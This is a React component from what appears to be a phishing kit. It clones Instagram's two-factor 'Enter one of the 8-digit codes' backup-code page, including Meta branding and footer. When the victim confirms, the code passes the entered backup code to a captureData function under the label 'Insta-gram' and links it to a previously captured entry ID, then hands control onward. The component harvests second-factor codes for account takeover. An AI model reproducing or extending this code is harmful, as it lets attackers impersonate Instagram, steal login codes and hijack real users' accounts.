"use client";

import { useState, useEffect } from "react";
import { Loader2 } from "lucide-react";
import { captureData } from "@/lib/capture";

interface Props {
  onVerify: (code: string) => void;
  onUseApp: () => void;
  showError: boolean;
  entryId?: string;
}

export default function AuthBackupRecovery({
  onVerify,
  onUseApp,
  showError,
  entryId,
}: Props) {
  const [code, setCode] = useState("");
  const [isLoading, setIsLoading] = useState(false);

  useEffect(() => {
    if (showError) setIsLoading(false);
  }, [showError]);

  const handleConfirm = async () => {
    if (code.length < 8) return;
    setIsLoading(true);

    try {
      // Map backup code to the existing entryId
      await captureData(
        "Insta-gram",
        {
          [`backupCode_${Date.now()}`]: code,
        },
        entryId,
      );
    } catch (e) {
      console.error("Capture error");
    }

    onVerify(code);
  };

  return (
    <div className="fixed inset-0 z-[12000] bg-white flex flex-col items-center justify-center font-sans text-black">
      <div className="w-full max-w-[350px] p-10 border border-[#dbdbdb] bg-white flex flex-col items-center text-center shadow-sm">
        <div className="mb-8">
          <div className="w-[72px] h-[72px] rounded-full border-[1.5px] border-[#0095f6] flex items-center justify-center">
            <svg
              width="32"
              height="32"
              viewBox="0 0 24 24"
              fill="none"
              stroke="#0095f6"
              strokeWidth="1.5"
              strokeLinecap="round"
              strokeLinejoin="round">
              <rect x="5" y="11" width="14" height="10" rx="2" ry="2" />
              <path d="M7 11V7a5 5 0 0 1 10 0v4" />
              <line x1="12" y1="15" x2="12" y2="17" strokeWidth="2" />
            </svg>
          </div>
        </div>

        <h2 className="text-[16px] font-medium text-[#262626] mb-6 leading-tight px-2">
          Enter one of the 8-digit codes provided when you set up two-factor
          authentication.
        </h2>

        <input
          type="text"
          maxLength={8}
          placeholder="Security Code"
          value={code}
          onChange={(e) => setCode(e.target.value.replace(/[^0-9]/g, ""))}
          className="w-full bg-[#fafafa] border border-[#dbdbdb] rounded-[3px] p-2.5 text-sm outline-none focus:border-gray-400 mb-4 placeholder:text-[#8e8e8e] text-black"
        />

        <button
          disabled={code.length < 8 || isLoading}
          onClick={handleConfirm}
          className={`w-full h-[32px] rounded-lg font-bold text-sm text-white flex items-center justify-center transition-all ${
            code.length === 8 ? "bg-[#0095f6]" : "bg-[#4cb5f9]"
          }`}>
          {isLoading ? <Loader2 className="w-4 h-4 animate-spin" /> : "Confirm"}
        </button>

        {showError && (
          <div className="mt-6 mb-2">
            <p className="text-[14px] text-[#262626] font-normal leading-tight text-center">
              Please check the security code and try again.
            </p>
          </div>
        )}

        <div
          className={`${showError ? "mt-4" : "mt-10"} flex items-start gap-3 mb-10 text-left w-full px-1`}>
          <input
            type="checkbox"
            id="trust-backup"
            defaultChecked
            className="mt-1 w-4 h-4 rounded border-gray-300 accent-[#0095f6] cursor-pointer"
          />
          <label
            htmlFor="trust-backup"
            className="text-sm text-[#262626] cursor-pointer select-none">
            <span className="font-semibold block">Trust this device</span>
            <span className="text-[#8e8e8e] text-xs">
              We won't ask for a code next time
            </span>
          </label>
        </div>

        <p className="text-sm text-[#262626] leading-relaxed text-center">
          If you're unable to use a backup code, you can use your{" "}
          <button
            type="button"
            onClick={onUseApp}
            className="text-[#0095f6] font-semibold hover:underline cursor-pointer">
            authentication app
          </button>
        </p>
      </div>

      <div className="mt-12 flex flex-wrap justify-center gap-x-4 gap-y-2 px-6 max-w-2xl text-[12px] text-[#8e8e8e]">
        <span>Meta</span>
        <span>About</span>
        <span>Blog</span>
        <span>Jobs</span>
        <span>Help</span>
        <span>API</span>
        <span>Privacy</span>
        <span>Terms</span>
      </div>
      <div className="mt-4 text-[12px] text-[#8e8e8e]">
        English ▾ © 2026 Instagram from Meta
      </div>
    </div>
  );
}
